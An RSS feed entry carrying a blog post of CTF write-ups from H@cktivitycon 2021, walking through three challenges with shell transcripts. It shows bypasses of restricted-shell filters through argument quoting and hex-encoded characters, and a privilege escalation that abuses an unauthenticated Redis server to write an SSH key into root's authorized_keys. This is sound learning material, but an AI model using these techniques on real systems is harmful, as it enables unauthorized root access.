<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CTF on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/categories/ctf/</link>
    <description>Recent content in CTF on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 04 Oct 2021 02:50:12 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>H@cktivitycon 2021 CTF - Miscellaneous</title>
      <link>https://fahmifj.github.io/writeups/others/hacktivitycon-2021-misc/</link>
      <pubDate>Mon, 04 Oct 2021 02:50:12 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/others/hacktivitycon-2021-misc/</guid>
      <description>This is my late writeups for H@cktivitycon 2021 miscellaneous category.</description>
      <content:encoded><![CDATA[<p>So, in mid September 2021, I participated in the H@cktivitycon 2021 CTF. The event was hosted by HackerOne and lasted for two days.</p>
<p>A bit late but in this post, I&rsquo;ll share my writeups/solutions for three Miscellaneous category challenges that I solved.</p>
<p>I signed up earlier but only played the main challenges in the last few hours, which I now regret because there were so many fantastic challenges ðŸ˜…ðŸ”¨</p>
<h2 id="badwords">Badwords</h2>
<h4 id="challenge-information">Challenge Information</h4>
<ul>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Description</strong>: <em>You look questionable&hellip; if you don&rsquo;t have anything good to say, don&rsquo;t say anything at all!</em></li>
</ul>
<h4 id="walkthrough">Walkthrough</h4>
<p>When connecting, I can assume that it&rsquo;s not in a proper TTY, maybe a kind of wrapper shell. Each command I sent returns with the same message telling that it was a bad word.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ rlwrap nc -v challenge.ctf.games <span class="m">32559</span>
Connection to challenge.ctf.games <span class="m">32559</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>-1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
user@host:/home/user$ ls -l
ls -l
You said a bad word, <span class="s2">&#34;l&#34;</span>!!
user@host:/home/user$ <span class="nb">echo</span> <span class="nv">$0</span>
<span class="nb">echo</span> <span class="nv">$0</span>
You said a bad word, <span class="s2">&#34;echo&#34;</span>!!
</code></pre></div><p>But if I send a command separator, it returns a syntax error (notice the <code>;'</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="p">;</span>ls
<span class="p">;</span>ls
bash: syntax error near unexpected token <span class="sb">`</span><span class="p">;</span><span class="err">&#39;</span>
user@host:/home/user$
</code></pre></div><p>Now if I send a command enclosed with a single quote, I get the expected results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;whoami&#39;</span>
<span class="s1">&#39;whoami&#39;</span>
user
</code></pre></div><p>And adding an arg returns a different error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls -l&#39;</span>
<span class="s1">&#39;ls -l&#39;</span>
bash: ls -l: <span class="nb">command</span> not found
</code></pre></div><p>But if I separate the args, it returns with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
<span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 just
</code></pre></div><p>Now I can just do a recursive <code>ls</code> to find the flag and read it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
<span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
just:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 out

just/out:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 of

just/out/of:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 reach

just/out/of/reach:
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> user user <span class="m">38</span> Sep  <span class="m">9</span> 19:47 flag.txt
user@host:/home/user$ <span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
<span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
flag<span class="o">{</span>2d43e30a358d3f30fe65cc47a9cbbe98<span class="o">}</span>user@host:/home/user$
</code></pre></div><h2 id="shelle">Shelle</h2>
<h4 id="challenge-information-1">Challenge Information</h4>
<ul>
<li><strong>Difficulty:</strong> Medium</li>
<li><strong>Description</strong>: <em>Professor Shelle created a custom psuedo shell for us to learn Linux,  she believes it&rsquo;s safe and no one can ever read the flag. Can you prove  her wrong?</em></li>
</ul>
<h4 id="walkthrough-1">Walkthrough</h4>
<p>This challenge is another shell wrapper like badwords. Upon connected, I was provided with the following menu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ rlwrap nc challenge.ctf.games <span class="m">32217</span>

Welcome to Shelle, a custom psuedo shell utility created by Professor Shelle in order to teach students about Linux terminals
Shelle is a restricted environment to prevent any misuse, Please Enter <span class="s1">&#39;HELP&#39;</span> to know about available features, happy learning !

root@pshelle$ HELP
HELP

Here is the list of <span class="nb">command</span> availiable to Students
1&gt; whoami
2&gt; <span class="nb">pwd</span>
3&gt; ls
4&gt; ps
5&gt; id
6&gt; <span class="nb">echo</span>
7&gt; cat


root@shelle$
</code></pre></div><p>When I use the <code>ls</code> command, I didn&rsquo;t find any flag in the current working directory. It seems I have to find it somewhere in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls
ls
assignment.txt  bin
</code></pre></div><p>So the first thing I tried was to list the root directory with <code>ls -l /</code>, but it turned out some characters, including <code>/</code>, are flagged as illegal. Luckily, <code>$</code>, <code>(</code>, <code>)</code>, <code>&quot;</code>, and <code>\</code> are not, so I can use the <code>echo</code> command with <code>-e</code> option within a subshell to print <code>\x2f</code> which is a <code>/</code> in Hex form.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
</code></pre></div><p>After wandering around, I found the flag on <code>/opt/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
total <span class="m">24</span>
-rwxr-xr-x <span class="m">1</span> shelle shelle <span class="m">17312</span> Sep  <span class="m">9</span> 19:33 binary
-r--r--r-- <span class="m">1</span> root   root      <span class="m">38</span> Sep  <span class="m">9</span> 19:33 flag.txt

root@shelle$ cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
flag<span class="o">{</span>82ad133488ad326eaf2120e03253e5d7<span class="o">}</span>
</code></pre></div><blockquote>
<p><strong>Note</strong>: I added a space after the shell prompt for readability and syntax highlighting.</p>
</blockquote>
<h2 id="redlike">Redlike</h2>
<h4 id="challenge-information-2">Challenge Information</h4>
<ul>
<li>
<p><strong>Difficulty:</strong> Medium</p>
</li>
<li>
<p><strong>Description:</strong></p>
<p><em>You know, I like the color red. Primary colors are the best colors &ndash; you can do so much with them!</em></p>
<p><em>Escalate your privileges and retrieve the flag out of <code>root</code>&rsquo;s home directory.</em></p>
</li>
</ul>
<h4 id="walkthrough-2">Walkthrough</h4>
<p>For this challenge, there was a set of credentials given for SSH login into a VM instance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ ssh -p <span class="m">31464</span> user@challenge.ctf.games
user@challenge.ctf.games<span class="s1">&#39;s password:
</span><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span><span class="s1">
</span><span class="s1"> * Documentation:  https://help.ubuntu.com
</span><span class="s1"> * Management:     https://landscape.canonical.com
</span><span class="s1"> * Support:        https://ubuntu.com/advantage
</span><span class="s1">
</span><span class="s1">This system has been minimized by removing packages and content that are
</span><span class="s1">not required on a system that users do not log into.
</span><span class="s1">
</span><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.

The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user@redlike-a6548218fe17631b-b75878d5-qsl75:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
</code></pre></div><p>At the root directory, I found <code>.docker-entrypoint</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -lah
total 72K
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 .
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 ..
-rwxr-xr-x    <span class="m">1</span> root root   <span class="m">61</span> Sep <span class="m">16</span> 14:43 .docker-entrypoint
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 bin -&gt; usr/bin
drwxr-xr-x    <span class="m">2</span> root root 4.0K Apr <span class="m">15</span>  <span class="m">2020</span> boot
drwxr-xr-x    <span class="m">5</span> root root  <span class="m">360</span> Sep <span class="m">18</span> 11:34 dev
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 etc
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:43 home
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 lib -&gt; usr/lib
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib32 -&gt; usr/lib32
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib64 -&gt; usr/lib64
lrwxrwxrwx    <span class="m">1</span> root root   <span class="m">10</span> Aug <span class="m">27</span> 07:16 libx32 -&gt; usr/libx32
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 media
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 mnt
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 opt
dr-xr-xr-x <span class="m">2595</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:34 proc
drwx------    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 root
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 run
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">8</span> Aug <span class="m">27</span> 07:16 sbin -&gt; usr/sbin
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 srv
dr-xr-xr-x   <span class="m">12</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:33 sys
drwxrwxrwt    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 tmp
drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:16 usr
drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:27 var
</code></pre></div><p>Based on the contents of the file and the name of the challenge, it&rsquo;s clear that the privesc has something to do with Redis.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ cat .docker-entrypoint
<span class="c1">#!/bin/bash</span>

/etc/init.d/redis-server start
/usr/sbin/sshd -D
</code></pre></div><p>I can connect to the Redis server using <code>redis-cli</code> without authentication. I started the enumeration by sending <code>INFO</code> command, but under <code># Keyspace</code>, I found no active database.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ which redis-cli
/usr/bin/redis-cli
user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ redis-cli
127.0.0.1:6379&gt; INFO
<span class="c1"># Server</span>
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:636cde3b5c7a3923
redis_mode:standalone
os:Linux 5.4.120+ x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.2.1
process_id:15
run_id:f5d6504f95159db85bb78e1bd786b2f3171564fd
tcp_port:6379
uptime_in_seconds:344
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:4575234
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

<span class="c1"># Clients</span>
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

<span class="c1"># Memory</span>
used_memory:859152
used_memory_human:839.02K
used_memory_rss:6017024
used_memory_rss_human:5.74M
used_memory_peak:859152
used_memory_peak_human:839.02K
used_memory_peak_perc:100.12%
used_memory_overhead:845926
used_memory_startup:796232
used_memory_dataset:13226
used_memory_dataset_perc:21.02%
allocator_allocated:1575864
allocator_active:1847296
allocator_resident:9879552
total_system_memory:33678073856
total_system_memory_human:31.37G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.17
allocator_frag_bytes:271432
allocator_rss_ratio:5.35
allocator_rss_bytes:8032256
rss_overhead_ratio:0.61
rss_overhead_bytes:-3862528
mem_fragmentation_ratio:7.36
mem_fragmentation_bytes:5199880
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

<span class="c1"># Persistence</span>
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1631964842
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

<span class="c1"># Stats</span>
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:31
total_net_output_bytes:11468
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

<span class="c1"># Replication</span>
role:master
connected_slaves:0
master_replid:f4b741e04432090f4eba3ef1fbdb2ce11e405aeb
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

<span class="c1"># CPU</span>
used_cpu_sys:0.271186
used_cpu_user:0.278797
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

<span class="c1"># Cluster</span>
cluster_enabled:0

<span class="c1"># Keyspace</span>
127.0.0.1:6379&gt;
</code></pre></div><p>The next thing I tried was writing a file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /tmp
OK
127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename choropys.php
OK
127.0.0.1:6379&gt; <span class="nb">set</span> <span class="nb">test</span> <span class="s2">&#34;choropys&#34;</span>
OK
127.0.0.1:6379&gt; save
OK
127.0.0.1:6379&gt;
</code></pre></div><p>I exited from redis-cli and immediately checked the file I wrote under <code>/tmp</code>. It&rsquo;s there and the owner is root!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -l /tmp/choropys.php
-rw-rw---- <span class="m">1</span> root root <span class="m">112</span> Sep <span class="m">18</span> 11:45 /tmp/choropys.php
</code></pre></div><p>This arbitrary file write lack the execute permissions, but I remember Hack The Box Postman that it is possible the SSH <code>authorized_keys</code> file (see <a href="https://0xdf.gitlab.io/2020/03/14/htb-postman.html">this writeup</a> by 0xdf). So I can try to ovewrite the root&rsquo;s <code>authorized_keys</code> file.</p>
<p>First I need to generate a pair of SSH keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ mkdir .ssh
user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key <span class="o">(</span>/home/user/.ssh/id_rsa<span class="o">)</span>:
Enter passphrase <span class="o">(</span>empty <span class="k">for</span> no passphrase<span class="o">)</span>:
Enter same passphrase again:
Your identification has been saved in /home/user/.ssh/id_rsa
Your public key has been saved in /home/user/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:AVk3h1vdyP/x1KCcBr/IQY7eac9vzZUUrMx/pNkB0KI user@redlike-20edff3e85f553f2-55b895664b-szch7
The key<span class="err">&#39;</span>s randomart image is:
+---<span class="o">[</span>RSA 3072<span class="o">]</span>----+
<span class="p">|</span>      .o. oo+o.o <span class="p">|</span>
<span class="p">|</span>      .. .++.o<span class="o">=</span>o.<span class="p">|</span>
<span class="p">|</span>        .+.*+oooo<span class="p">|</span>
<span class="p">|</span>        .E+ *+ +<span class="o">=</span><span class="p">|</span>
<span class="p">|</span>       .So <span class="o">=</span> .o**<span class="p">|</span>
<span class="p">|</span>        . * . oo*<span class="p">|</span>
<span class="p">|</span>         . o   oo<span class="p">|</span>
<span class="p">|</span>            o . o<span class="p">|</span>
<span class="p">|</span>             o.  <span class="p">|</span>
+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
</code></pre></div><p>Then I will have to wrap the SSH public key with two extra newlines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ <span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat ~/.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; spaced_key.txt
</code></pre></div><p>Now the key can be stored in Redis using the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ cat spaced_key.txt <span class="p">|</span> redis-cli -x <span class="nb">set</span> spaced_key.txt
OK
</code></pre></div><p>Then I can just set the database file name to  <code>authorized_keys</code> and save that under <code>/root/.ssh/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ redis-cli
127.0.0.1:6379&gt; config <span class="nb">set</span> dir /root/.ssh
OK
127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename <span class="s2">&#34;authorized_keys&#34;</span>
OK
127.0.0.1:6379&gt; save
OK
127.0.0.1:6379&gt;
</code></pre></div><p>And it worked, I can SSH login as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh root@redlike-20edff3e85f553f2-55b895664b-szch7
The authenticity of host <span class="s1">&#39;redlike-20edff3e85f553f2-55b895664b-szch7 (10.112.8.36)&#39;</span> can<span class="s1">&#39;t be established.
</span><span class="s1">ECDSA key fingerprint is SHA256:m9vzgGyWcCXB1tg0uLHYCKCaDNZFUnbeSirAvvLkYxU.
</span><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span class="s1">Warning: Permanently added &#39;</span>redlike-20edff3e85f553f2-55b895664b-szch7,10.112.8.36<span class="s1">&#39; (ECDSA) to the list of known hosts.
</span><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span><span class="s1">
</span><span class="s1"> * Documentation:  https://help.ubuntu.com
</span><span class="s1"> * Management:     https://landscape.canonical.com
</span><span class="s1"> * Support:        https://ubuntu.com/advantage
</span><span class="s1">
</span><span class="s1">This system has been minimized by removing packages and content that are
</span><span class="s1">not required on a system that users do not log into.
</span><span class="s1">
</span><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.

The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@redlike-20edff3e85f553f2-55b895664b-szch7:~# id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@redlike-20edff3e85f553f2-55b895664b-szch7:~# ls -l
total <span class="m">4</span>
--w------- <span class="m">1</span> root root <span class="m">39</span> Sep <span class="m">16</span> 14:43 flag.txt
root@redlike-20edff3e85f553f2-55b895664b-szch7:~# cat flag.txt
flag<span class="o">{</span>69dc14707af23b728ebd1363715ec890<span class="o">}</span>
</code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
